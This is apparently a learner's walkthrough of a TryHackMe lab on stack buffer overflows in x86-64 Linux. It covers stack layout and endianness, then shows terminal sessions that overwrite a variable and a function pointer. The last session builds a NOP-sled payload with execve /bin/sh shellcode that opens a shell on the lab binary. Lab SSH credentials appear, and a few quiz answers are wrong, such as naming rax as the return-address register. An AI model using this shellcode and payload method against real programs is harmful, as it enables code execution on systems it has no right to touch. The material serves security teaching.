---
Learn how to get started with basic Buffer Overflows!
---

![|222](https://tryhackme-images.s3.amazonaws.com/room-icons/5d2d89202b5a142b9fdc22cfcb682861.png)

	In this room, we aim to explore simple stack buffer overflows(without any mitigations) on x86-64 linux programs. We will use radare2 (r2) to examine the memory layout. You are expected to be familiar with x86 and r2 for this room. 

https://github.com/radare/radare2

We have included a virtual machine with all the resources to ensure you have the correct environment and tools to follow along. To access the machine via SSH, use the following credentials:

Username: user1
Password: user1password

```
┌──(kali㉿kali)-[~/Downloads/PHishing]
└─$ ssh user1@10.10.69.210    
The authenticity of host '10.10.69.210 (10.10.69.210)' can't be established.
ED25519 key fingerprint is SHA256:AsF56RWYwwHAw06LwzfQZsBY9+GuN1jrYmQRK3FP5dU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.69.210' (ED25519) to the list of known hosts.
user1@10.10.69.210's password: 
Last login: Wed Nov 27 21:42:30 2019 from 82.34.52.37

       __|  __|_  )
       _|  (     /   Amazon Linux 2 AMI
      ___|\___|___|

https://aws.amazon.com/amazon-linux-2/
[user1@ip-10-10-69-210 ~]$ whoami
user1
[user1@ip
```
###  Process Layout 

When a program runs on a machine, the computer runs the program as a process. Current computer architecture allows multiple processes to be run concurrently(at the same time by a computer). While these processes may appear to run at the same time, the computer actually switches between the processes very quickly and makes it look like they are running at the same time. Switching between processes is called a context switch. Since each process may need different information to run(e.g. The current instruction to execute), the operating system has to keep track of all the information in a process. The memory in the process is organised sequentially and has the following layout: 

![](https://i.imgur.com/KmWsaIs.png)

    User stack contains the information required to run the program. This information would include the current program counter, saved registers and more information(we will go into detail in the next section). The section after the user stack is unused memory and it is used in case the stack grows(downwards)

    Shared library regions are used to either statically/dynamically link libraries that are used by the program

    The heap increases and decreases dynamically depending on whether a program dynamically assigns memory. Notice there is a section that is unassigned above the heap which is used in the event that the size of the heap increases.

    The program code and data stores the program executable and initialised variables.



Where is dynamically allocated memory stored?
*heap*

Where is information about functions(e.g. local arguments) stored?
*stack*

### x86-64 Procedures 

![](https://i.imgur.com/YITSp30.png)

A program would usually comprise of multiple functions and there needs to be a way of tracking which function has been called, and which data is passed from one function to another. The stack is a region of contiguous memory addresses and it is used to make it easy to transfer control and data between functions. The top of the stack is at the lowest memory address and the stack grows towards lower memory addresses. The most common operations of the stack are:


Pushing: used to add data onto the stack

Popping: used to remove data from the stack

push var

This is the assembly instruction to push a value onto the stack. It does the following:

    Uses var or value stored in memory location of var

![](https://i.imgur.com/TFH7KDf.png)

    Decrements the stack pointer(known as rsp) by 8

    Writes above value to new location of rsp, which is now the top of the stack

![](https://i.imgur.com/fLz86wR.png)

pop var

This is an assembly instruction to read a value and pop it off the stack. It does the following:

    Reads the value at the address given by the stack pointer

![](https://i.imgur.com/tuH0By9.png)

    Increment the stack pointer by 8

    Store the value that was read from rsp into var

![](https://i.imgur.com/dWPAXEF.png)

It’s important to note that the memory does not change when popping values of the stack - it is only the value of the stack pointer that changes! 

Each compiled program may include multiple functions, where each function would need to store local variables, arguments passed to the function and more. To make this easy to manage, each function has its own separate stack frame, where each new stack frame is allocated when a function is called, and deallocated when the function is complete. 

![](https://i.imgur.com/0OsNBwQ.png)

This is easily explained using an example. Look at the two functions:

```
int add(int a, int b){

   int new = a + b;

   return new;

}


int calc(int a, int b){

   int final = add(a, b);

   return final;

}


calc(4, 5)
```



what direction does the stack grown(l for lower/h for higher)
*l*


what instruction is used to add data onto the stack?
*push*

###  Procedures Continued 

The explanation assumes that the current point of execution is inside the calc function. In this case calc is known as the caller function and add is known as the callee function. The following presents the assembly code inside the calc function

![](https://lh3.googleusercontent.com/drfkuTdzr6yTKq2tPgCO95_knSqbNa0_iApkl3w62yDGZIOu_6ZxMMcQE4SD-X4p-3AW656Azf3iWqCjRqC4S6O8PbcseQS3r0mzuyB0T2WZdfxs7HtVVqGheU5R2zBVSjEix3sS)

![](https://i.imgur.com/14sqeAZ.png)

The add function is invoked using the call operand in assembly, in this case callq sym.add. The call operand can either take a label as an argument(e.g. A function name), or it can take a memory address as an offset to the location of the start of the function in the form of call *value. Once the add function is invoked(and after it is completed), the program would need to know what point to continue in the program. To do this, the computer pushes the address of the next instruction onto the stack, in this case the address of the instruction on the line that contains movl %eax, local_4h. After this, the program would allocate a stack frame for the new function, change the current instruction pointer to the first instruction in the function, change the stack pointer(rsp) to the top of the stack, and change the frame pointer(rbp) to point to the start of the new frame. 

![](https://lh3.googleusercontent.com/IgWTFeegf8jSIlpJAz-jdJW_I477jiXWvY-kkGUjZ_iIIGgj_gBKac0-bzonwNrlpAw6sUvh7ZkejC50peTnWKfxZAUUiQA_QiYwlAkgDA7gkOdJZIqpDruAeVeqOODCEfCsv325)

![](https://i.imgur.com/BZMUlMe.png)

Once the function is finished executing, it will call the return instruction(retq). This instruction will pop the value of the return address of the stack, deallocate the stack frame for the add function, change the instruction pointer to the value of the return address, change the stack pointer(rsp) to the top of the stack and change the frame pointer(rbp) to the stack frame of calc.

![](https://i.imgur.com/VF6LfjU.png)

![](https://lh4.googleusercontent.com/t_UvTV0iBr99rf31_UNd3VmXKjpN4CNwJ5bI3_q5mGksmCMYTzryujyZg_6NP-sljh1J7xFfbeUEv0cPmoXsLtBF6GpUTJVMnqU4xquGSr2UQNFg1xhz7E6zRVgAZfrdlUlOoWAl)

Now that we’ve understood how control is transferred through functions, let’s look at how data is transferred. 

In the above example, we save that functions take arguments. The calc function takes 2 arguments(a and b). Upto 6 arguments for functions can be stored in the following registers:

    rdi

    rsi

    rdx

    rcx

    r8

    r9

Note: rax is a special register that stores the return values of the functions(if any).

If a function has anymore arguments, these arguments would be stored on the functions stack frame. 

We can now see that a caller function may save values in their registers, but what happens if a callee function also wants to save values in the registers? To ensure the values are not overwritten, the callee values first save the values of the registers on their stack frame, use the registers and then load the values back into the registers. The caller function can also save values on the caller function frame to prevent the values from being overwritten. Here are some rules around which registers are caller and callee saved:

    rax is caller saved

    rdi, rsi, rdx, rcx r8 and r9 are called saved(and they are usually arguments for functions)

    r10, r11 are caller saved

    rbx, r12, r13, r14 are callee saved 

    rbp is also callee saved(and can be optionally used as a frame pointer)

    rsp is callee saved

So far, this is a more thorough example of the run time stack:

![](https://i.imgur.com/vA0ug3J.png)



What register stores the return address?
*rax*

### Endianess 

In the above programs, you can see that the binary information is represented in hexadecimal format. Different architectures actually represent the same hexadecimal number in different ways, and this is what is referred to as Endianess. Let’s take the value of 0x12345678 as an example. Here the least significant value is the right most value(78) while the most significant value is the left most value(12).


Little Endian is where the value is arranged from the least significant byte to the most significant byte:

![](https://i.imgur.com/tSYo8AS.png)

Big Endian is where the value is arranged from the most significant byte to the least significant byte.

![](https://i.imgur.com/ltUjHQ7.png)

Here, each “value” requires at least a byte to represent, as part of a multi-byte object.

### Overwriting Variables 

Now that we’ve looked at all the background information, let’s explore how the overflows actually work. If you take a look at the overflow-1 folder, you’ll notice some C code with a binary program. Your goal is to change the value of the integer variable. 

```
[user1@ip-10-10-69-210 ~]$ ls
overflow-1  overflow-2  overflow-3  overflow-4
[user1@ip-10-10-69-210 ~]$ cd overflow-1
[user1@ip-10-10-69-210 overflow-1]$ ls
int-overflow  int-overflow.c
[user1@ip-10-10-69-210 overflow-1]$ cat int-overflow.c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int variable = 0;
  char buffer[14];

  gets(buffer);

  if(variable != 0) {
      printf("You have changed the value of the variable\n");
  } else {
      printf("Try again?\n");
  }
}
[user1@ip-10-10-69-210 overflow-1]$ ./int-overflow 
111
Try again?
[user1@ip-10-10-69-210 overflow-1]$ ./int-overflow 
1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
You have changed the value of the variable
Segmentation fault

```

From the C code you can see that the integer variable and character buffer have been allocated next to each other - since memory is allocated in contiguous bytes, you can assume that the integer variable and character buffer are allocated next to each other. 

Note: this may not always be the case. With how the compiler and stack are configured, when variables are allocated, they would need to be aligned to particular size boundaries(e.g. 8 bytes, 16 byte) to make it easier for memory allocation/deallocation. So if a 12 byte array is allocated where the stack is aligned for 16 bytes this is what the memory would look like:

![](https://i.imgur.com/kjxX8SC.png)

the compiler would automatically add 4 bytes to ensure that the size of the variable aligns with the stack size. From the image of the stack above, we can assume that the stack frame for the main function looks like this:

![](https://i.imgur.com/lqE6o0S.png)

even though the stack grows downwards, when data is copied/written into the buffer, it is copied from lower to higher addresess. Depending on how data is entered into the buffer, it means that it's possible to overwrite the integer variable. From the C code, you can see that the gets function is used to enter data into the buffer from standard input. The gets function is dangerous because it doesn't really have a length check - This would mean that you can enter more than 14 bytes of data, which would then overwrite the integer variable. 

![](https://lh5.googleusercontent.com/dJUUDKVA7jhFiDZXzIMV8Esy1hgjiM5l8BOgJT3iz91gAP0P3vqY2HemDm5s8nw8KkCumN7IWdM1X3pJ_256OEqMc_kYwZD_iDk5NaAIceAHsPR6mcw2CtGgA0u6V_00hD6tWmGK)


Try run the C program in this folder to overwrite the above variable!



What is the minimum number of characters needed to overwrite the variable?

```
[user1@ip-10-10-69-210 overflow-1]$ ./int-overflow 
123456789abcd
Try again?
[user1@ip-10-10-69-210 overflow-1]$ ./int-overflow 
1234567890abcd
Try again?
[user1@ip-10-10-69-210 overflow-1]$ ./int-overflow 
1234567890abcde
You have changed the value of the variable

```
*15*

```
getting files

┌──(kali㉿kali)-[~/bufferoverflow/learn]
└─$ ls     
                                                                                                             
┌──(kali㉿kali)-[~/bufferoverflow/learn]
└─$ scp user1@10.10.69.210:/home/user1/overflow-1/* .
user1@10.10.69.210's password: user1password
int-overflow                                                               100% 8224    12.6KB/s   00:00    
int-overflow.c                                                             100%  291     0.5KB/s   00:00    
                                                                                                             
┌──(kali㉿kali)-[~/bufferoverflow/learn]
└─$ ls
int-overflow  int-overflow.c
                                                                                                             
┌──(kali㉿kali)-[~/bufferoverflow/learn]
└─$ scp user1@10.10.69.210:/home/user1/overflow-2/* .
user1@10.10.69.210's password: 
func-pointer                                                               100% 8368    12.6KB/s   00:00    
func-pointer.c                                                             100%  411     0.6KB/s   00:00    
                                                                                                             
┌──(kali㉿kali)-[~/bufferoverflow/learn]
└─$ scp user1@10.10.69.210:/home/user1/overflow-3/* .
user1@10.10.69.210's password: 
buffer-overflow                                                            100% 8264    12.4KB/s   00:00    
buffer-overflow.c                                                          100%  285     0.4KB/s   00:00    
scp: remote open "/home/user1/overflow-3/secret.txt": Permission denied
                                                                                                             
┌──(kali㉿kali)-[~/bufferoverflow/learn]
└─$ scp user1@10.10.69.210:/home/user1/overflow-4/* .
user1@10.10.69.210's password: 
buffer-overflow-2                                                          100% 8272    12.6KB/s   00:00    
buffer-overflow-2.c                                                        100%  250     0.4KB/s   00:00    
scp: remote open "/home/user1/overflow-4/secret.txt": Permission denied
                                                                                                             
┌──(kali㉿kali)-[~/bufferoverflow/learn]
└─$ ls
buffer-overflow    buffer-overflow-2.c  func-pointer    int-overflow
buffer-overflow-2  buffer-overflow.c    func-pointer.c  int-overflow.c

```

### Overwriting Function Pointers 

For this example, look at the overflow- 2 folder. Inside this folder, you’ll notice the following C code.

![](https://lh4.googleusercontent.com/jExdQt8fqc6CyqywnAs8ijPmkNH2YTNWdxXgutL22XSt0wzqBQf0whSRVpq-bQUztTpllgiya1ov8MbvBjJNVq_IiPAi6b381Z7Q3N1lkzEOqamMZQuoC5_yHCrG5jkv8wRrT0i2)

Similar to the example above, data is read into a buffer using the gets function, but the variable above the buffer is not a pointer to a function. A pointer, like its name implies, is used to point to a memory location, and in this case the memory location is that of the normal function. The stack is laid out similar to the example above, but this time you have to find a way of invoking the special function(maybe using the memory address of the function). Try invoke the special function in the program. 

Keep in mind that the architecture of this machine is little endian!


Invoke the special function()
check the memory address of the function!

```
[user1@ip-10-10-69-210 overflow-2]$ gdb func-pointer
GNU gdb (GDB) Red Hat Enterprise Linux 8.0.1-30.amzn2.0.3
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-redhat-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from func-pointer...(no debugging symbols found)...done.
(gdb) run
Starting program: /home/user1/overflow-2/func-pointer 
Missing separate debuginfos, use: debuginfo-install glibc-2.26-32.amzn2.0.1.x86_64
AAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400041 in ?? ()


or
We then run this set command, which sets gdb to use the environment to use the absolute path of any executables we run: AKA it means any exploit you make inside gdb will work outside of gdb after doing that.

set exec-wrapper env -u LINES -u COLUMNS


[user1@ip-10-10-69-210 overflow-2]$ gdb func-pointer
GNU gdb (GDB) Red Hat Enterprise Linux 8.0.1-30.amzn2.0.3
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-redhat-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from func-pointer...(no debugging symbols found)...done.
(gdb) set exec-wrapper env -u LINES -u COLUMNS
(gdb) run
Starting program: /home/user1/overflow-2/func-pointer 
Missing separate debuginfos, use: debuginfo-install glibc-2.26-32.amzn2.0.1.x86_64
1234567890
this is the normal function
[Inferior 1 (process 5545) exited normally]

Finding the return address

(gdb) run
Starting program: /home/user1/overflow-2/func-pointer 
AAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400041 in ?? ()

Inputting 15 "A"s causes the rightmost character in the return address to be a "41" (the hexcode for 'A').  This means we have successfully started overwriting the return address!  We must then check how much space we have in the return address to overwrite:


(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-2/func-pointer 
AAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000414141414141 in ?? ()


(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-2/func-pointer 
AAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x00000000004005da in main ()


As we can see, sending an input of 20 "A"s overwrites the return address with all "41"s (the hex conversion of 'A').  Meaning, we have successfully overwritten the return address! In the next one, overwriting it with 21 "A"s causes the return address to no longer be overwritten and redirect somewhere else, meaning we went too far!  That means we then have 6 bytes with which to overwrite the return address (20-14=6).

so when is 0x0000414141414141 need to rest 6 and it's the segmentation fault when begins

┌──(kali㉿kali)-[~]
└─$ python2               
Python 2.7.18 (default, Aug  1 2022, 06:23:55) 
[GCC 12.1.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> print 'A' * 20
AAAAAAAAAAAAAAAAAAAA (it's limited)
>>> print 'A' * 21
AAAAAAAAAAAAAAAAAAAAA (fail)

Overwriting the return address with the Special Function
We now have all the pieces set up in order to return to the special function, except one: the address of the special function! To find this, inside of gdb we can find it like so:

disassemble special

(gdb) disassemble special
Dump of assembler code for function special:
   0x0000000000400567 <+0>:     push   %rbp
   0x0000000000400568 <+1>:     mov    %rsp,%rbp
   0x000000000040056b <+4>:     mov    $0x400680,%edi
   0x0000000000400570 <+9>:     callq  0x400460 <puts@plt>
   0x0000000000400575 <+14>:    mov    $0x40069d,%edi
   0x000000000040057a <+19>:    callq  0x400460 <puts@plt>
   0x000000000040057f <+24>:    nop
   0x0000000000400580 <+25>:    pop    %rbp
   0x0000000000400581 <+26>:    retq   
End of assembler dump.

Great, from the first line, we see that the function begins at '0x0000000000400567'.  So what we need to do next is overwrite the return address with what we've found!

As was mentioned earlier in the room, the architecture determines the endianess of the memory.  We're dealing with little endian, and so the memory location we actually need to write, written in little endian, is:

\x67\x05\x40\x00\x00\x00 

now let's do it!

┌──(kali㉿kali)-[~/bufferoverflow/learn]
└─$ python2 -c "print 'A' * 13" | ./func-pointer
this is the normal function

┌──(kali㉿kali)-[~/bufferoverflow/learn]
└─$ python2 -c "print 'A' * 14" | ./func-pointer
zsh: done                          python2 -c "print 'A' * 14" | 
zsh: illegal hardware instruction  ./func-pointer

┌──(kali㉿kali)-[~/bufferoverflow/learn]
└─$ python2 -c "print 'A' * 15" | ./func-pointer
zsh: done                python2 -c "print 'A' * 15" | 
zsh: segmentation fault  ./func-pointer

so let's add it return address

┌──(kali㉿kali)-[~/bufferoverflow/learn]
└─$ python2 -c "print 'A' * 14 + '\x67\x05\x40\x00\x00\x00'" | ./func-pointer
this is the special function
you did this, friend!


```

### Buffer Overflows 

For this example, look at overflow-3 folder. Inside this folder, you’ll find the following C code.

![](https://lh6.googleusercontent.com/6rGkQTpjleEqcJC8OQ6rC0ccdd1ebufPN5F-NuFiQmfCrZuLpjHQEPfKrEEGxbqBrShqS5FFIs05q24gRm1ylOR1Pz1QZgw-4t7isuaABnf2EbV1lZ3b9Xmryhx3eV30M5qO9Bex)

This example will cover some of the more interesting, and useful things you can do with a buffer overflow. In the previous examples, we’ve seen that when a program takes users controlled input, it may not check the length, and thus a malicious user could overwrite values and actually change variables.

In this example, in the copy_arg function we can see that the strcpy function is copying input from a string(which is argv[1] which is a command line argument) to a buffer of length 140 bytes. With the nature of strcpy, it does not check the length of the data being input so here it’s also possible to overflow the buffer - we can do something more malicious here. 

Let’s take a look at what the stack will look like for the copy_arg function(this stack excludes the stack frame for the strcpy function):

![](https://i.imgur.com/zNMC7in.png)

Earlier, we saw that when a function(in this case main) calls another function(in this case copy_args), it needs to add the return address on the stack so the callee function(copy_args) knows where to transfer control to once it has finished executing. From the stack above, we know that data will be copied upwards from buffer[0] to buffer[140]. Since we can overflow the buffer, it also follows that we can overflow the return address with our own value. We can control where the function returns and change the flow of execution of a program(very cool, right?)

Know that we know we can control the flow of execution by directing the return address to some memory address, how do we actually do something useful with this. This is where shellcode comes in; shell code quite literally is code that will open up a shell. More specifically, it is binary instructions that can be executed. Since shellcode is just machine code(in the form of binary instructions), you can usually start of by writing a C program to do what you want, compile it into assembly and extract the hex characters(alternatively it would involve writing your own assembly). For now we’ll use this shellcode that opens up a basic shell:

	\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05

So why don’t we looking at actually executing this shellcode. The basic idea is that we need to point the overwritten return address to the shellcode, but where do we actually store the shellcode and what actual address do we point it at? Why don’t we store the shellcode in the buffer - because we know the address at the beginning of the buffer, we can just overwrite the return address to point to the start of the buffer. Here’s the general process so far:

    Find out the address of the start of the buffer and the start address of the return address

    Calculate the difference between these addresses so you know how much data to enter to overflow

    Start out by entering the shellcode in the buffer, entering random data between the shellcode and the return address, and the address of the buffer in the return address

![](https://i.imgur.com/ktEI9zu.png)

In theory, this looks like it would work quite well. However, memory addresses may not be the same on different systems, even across the same computer when the program is recompiled. So we can make this more flexible using a NOP instruction. A NOP instruction is a no operation instruction - when the system processes this instruction, it does nothing, and carries on execution. A NOP instruction is represented using \x90. Putting NOPs as part of the payload means an attacker can jump anywhere in the memory region that includes a NOP and eventually reach the intended instructions. This is what an injection vector would look like:

![](https://i.imgur.com/olQ17Tg.png)

You’ve probably noticed that shellcode, memory addresses and NOP sleds are usually in hex code. To make it easy to pass the payload to an input program, you can use python:

	python -c “print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory address)”

Using this format would be something like this for this challenge:

```
python2 -c "print('\x90' * 30 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + '\x41' * 60 + '\xef\xbe\xad\xde') | ./program_name "
```

In some cases you may need to pass xargs before ./program_name.

```
[user1@ip-10-10-69-210 overflow-3]$ ./buffer-overflow $(python2 -c "print 'A'*158")
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault


[user1@ip-10-10-69-210 overflow-3]$ ./buffer-overflow $(python2 -c "print '\x90' * 30 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + '\x41' * 60 + '\xef\xbe\xad\xde'")
Here's a program that echo's out your input
������������������������������H�/bin/shH�H�QH�<$H1Ұ;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�


so let's go

[user1@ip-10-10-69-210 overflow-3]$ gdb buffer-overflow
GNU gdb (GDB) Red Hat Enterprise Linux 8.0.1-30.amzn2.0.3
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-redhat-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from buffer-overflow...(no debugging symbols found)...done.
(gdb) run $(python2 -c "print 'A' * 158")
Starting program: /home/user1/overflow-3/buffer-overflow $(python2 -c "print 'A' * 158")
Missing separate debuginfos, use: debuginfo-install glibc-2.26-32.amzn2.0.1.x86_64
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000414141414141 in ?? () 

158-6 = 152

with 153 will be overwriting and with 159 will be passed

(gdb) run $(python2 -c "print 'A' * 153")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-3/buffer-overflow $(python2 -c "print 'A' * 153")
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400041 in ?? ()

cz x41 in hexadecimal to ASCII is A (try using it)
https://www.binaryhexconverter.com/hex-to-ascii-text-converter

With a 158 bytes length payload, we are overwritting 6 bytes of the return address. As a result, the offset will be 152 bytes.


shellcode (40 bytes) that works here: https://www.arsouyes.org/blog/2019/54_Shellcode/

>>> shellcode = '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'
>>> len(shellcode)
40

Return address

The last item we need to complete our payload is the return address of the shell code (6 bytes). Our payload will be like this:

┌───────────────────┬────────────────────┬────────────────────┬────────────────────┐
│ NOP sled (90)     │  shell code (40)   │  random chars (22) │ Memory address (6) │
└───────────────────┴────────────────────┴────────────────────┴────────────────────┘
total length = 90 + 40 + 22 + 6 = 158

or can be using tryhackme shellcode which is len 30 so 90 + 30 + 12 + 6 = 158

anyways

>>> payload = '\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*22 + 'B'*6
>>> len(payload)
158


(gdb) run $(python2 -c "print '\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*22 + 'B'*6")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-3/buffer-overflow $(python2 -c "print '\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*22 + 'B'*6")
Here's a program that echo's out your input
������������������������������������������������������������������������������������������j;XH1�I�//bin/shIAPH��RWH��j<XH1�����������������������BBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x0000424242424242 in ?? ()

See where NOP sled string is located, and beginning of shellcode. 

(gdb) x/100x 
Argument required (starting display address).
(gdb) x/100x $rsp-200
0x7fffffffe228: 0x00400450      0x00000000      0xffffe3e0      0x00007fff
0x7fffffffe238: 0x00400561      0x00000000      0xf7dce8c0      0x00007fff
0x7fffffffe248: 0xffffe649      0x00007fff      0x90909090      0x90909090
0x7fffffffe258: 0x90909090      0x90909090      0x90909090      0x90909090
0x7fffffffe268: 0x90909090      0x90909090      0x90909090      0x90909090
0x7fffffffe278: 0x90909090      0x90909090      0x90909090      0x90909090
0x7fffffffe288: 0x90909090      0x90909090      0x90909090      0x90909090
0x7fffffffe298: 0x90909090      0x90909090      0x90909090      0x90909090
0x7fffffffe2a8: 0x3b6a9090      0xd2314858      0x2f2fb849      0x2f6e6962
0x7fffffffe2b8: 0xc1496873      0x504108e8      0x52e78948      0xe6894857
0x7fffffffe2c8: 0x3c6a050f      0xff314858      0x9090050f      0x90909090
0x7fffffffe2d8: 0x90909090      0x90909090      0x90909090      0x90909090
0x7fffffffe2e8: 0x42424242      0x00004242      0xffffe3e8      0x00007fff
0x7fffffffe2f8: 0x00000000      0x00000002      0x004005a0      0x00000000
0x7fffffffe308: 0xf7a4302a      0x00007fff      0x00000000      0x00000000
0x7fffffffe318: 0xffffe3e8      0x00007fff      0x00040000      0x00000002
0x7fffffffe328: 0x00400564      0x00000000      0x00000000      0x00000000
0x7fffffffe338: 0xc3f0b440      0xc6a53754      0x00400450      0x00000000


0x7fffffffe298: 0x3b6a9090  0xd2314858  0x2f2fb849  0x2f6e6962 <--- shellcode

so before this one will be NOP sled final

0x7fffffffe218: 0x00400450  0x00000000  0xffffe3d0  0x00007fff
0x7fffffffe228: 0x00400561  0x00000000  0xf7dce8c0  0x00007fff
0x7fffffffe238: 0xffffe639  0x00007fff  0x90909090  0x90909090 <--- NOP sled
0x7fffffffe248: 0x90909090  0x90909090  0x90909090  0x90909090
0x7fffffffe258: 0x90909090  0x90909090  0x90909090  0x90909090
0x7fffffffe268: 0x90909090  0x90909090  0x90909090  0x90909090
0x7fffffffe278: 0x90909090  0x90909090  0x90909090  0x90909090
0x7fffffffe288: 0x90909090  0x90909090  0x90909090  0x90909090
0x7fffffffe298: 0x3b6a9090  0xd2314858  0x2f2fb849  0x2f6e6962 <--- shellcode


Let’s take any address between the NOP sled and the shellcode (e.g. 0x7fffffffe288). Here is the final payload:

\x88\xe2\xff\xff\xff\x7f

so final payload will be

./buffer-overflow $(python2 -c "print '\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*22 + '\x88\xe2\xff\xff\xff\x7f'")


---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) quit
A debugging session is active.

        Inferior 1 [process 6093] will be killed.

Quit anyway? (y or n) y
[user1@ip-10-10-69-210 overflow-3]$ ./buffer-overflow $(python2 -c "print '\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*22 + '\x88\xe2\xff\xff\xff\x7f'")
Here's a program that echo's out your input
������������������������������������������������������������������������������������������j;XH1�I�//bin/shIAPH��RWH��j<XH1����������������������������
sh-4.2$ whoami
user1
sh-4.2$ cat secret.txt
